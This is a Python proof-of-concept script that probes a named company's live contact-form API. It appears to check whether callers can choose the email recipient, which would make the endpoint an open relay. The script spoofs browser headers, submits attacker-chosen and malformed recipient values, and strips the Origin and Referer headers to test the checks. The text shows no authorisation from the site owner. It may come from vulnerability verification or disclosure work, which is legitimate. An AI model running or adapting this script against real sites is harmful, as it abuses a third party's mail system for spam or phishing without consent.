#!/usr/bin/env python3
"""Independent verification probe for POST https://www.infinitycapital.bh/api/send"""
import json, ssl, sys, urllib.request, urllib.parse, urllib.error, time

URL = "https://www.infinitycapital.bh/api/send"
UA  = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

ctx = ssl.create_default_context()

def post(form: dict, extra_headers=None, label=""):
    data = urllib.parse.urlencode(form).encode()
    hdrs = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": UA,
        "Accept": "*/*",
        "Origin": "https://www.infinitycapital.bh",
        "Referer": "https://www.infinitycapital.bh/contact",
    }
    if extra_headers:
        hdrs.update(extra_headers)
    req = urllib.request.Request(URL, data=data, headers=hdrs, method="POST")
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
            body = r.read().decode("utf-8", "replace")
            status = r.status
            rh = dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        status = e.code
        rh = dict(e.headers)
    except Exception as e:
        body = "EXC: %r" % (e,)
        status = -1
        rh = {}
    dt = time.time() - t0
    print("=" * 78)
    print("[%s] POST /api/send  -> HTTP %s  (%.2fs)" % (label, status, dt))
    print("--- request body ---")
    print(urllib.parse.urlencode(form))
    print("--- response headers ---")
    for k in ("content-type", "server", "x-vercel-id", "x-vercel-mitigated",
              "x-matched-path", "x-powered-by", "set-cookie", "content-security-policy",
              "x-robots-tag"):
        if k in rh:
            print("  %s: %s" % (k, rh[k]))
    print("--- response body (first 600) ---")
    print(body[:600])
    print()
    return status, body, rh

if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "all"
    base = dict(fname="Verify", lname="Test", areacode="973", tel="5551234",
                cname="QA Tester", subject="Verify probe", msg="verify probe body",
                check="on")
    if which in ("all", "1"):
        # T1: attacker-chosen external recipient, bare address
        post(dict(base, targets="verifyprobe20260930@zzzmailinator.com"), label="T1 arbitrary external recipient")
    if which in ("all", "2"):
        # T2: RFC5322 display-name form
        post(dict(base, targets="QA Tester <verifyprobe20260930@zzzmailinator.com>"), label="T2 Name <addr> form")
    if which in ("all", "3"):
        # T3: deliberately invalid recipient -> proves the `to` is attacker supplied
        post(dict(base, targets="not-an-email"), label="T3 invalid recipient (validation order)")
    if which in ("all", "4"):
        # T4: no Origin/Referer at all, no cookies
        post(dict(base, targets="verifyprobe20260930@zzzmailinator.com"),
             extra_headers={"Origin": "", "Referer": ""}, label="T4 no Origin/Referer")
